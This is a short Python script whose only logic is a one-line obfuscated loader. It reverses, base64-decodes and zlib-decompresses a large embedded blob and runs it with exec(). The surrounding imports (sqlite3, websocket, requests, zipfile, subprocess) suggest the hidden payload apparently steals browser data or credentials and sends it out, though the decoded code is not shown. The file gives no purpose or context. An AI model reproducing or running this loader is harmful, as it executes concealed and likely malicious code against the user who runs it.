import os
import json
import subprocess
import websocket
import requests
import sqlite3
import base64
import argparse
import zipfile
         
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
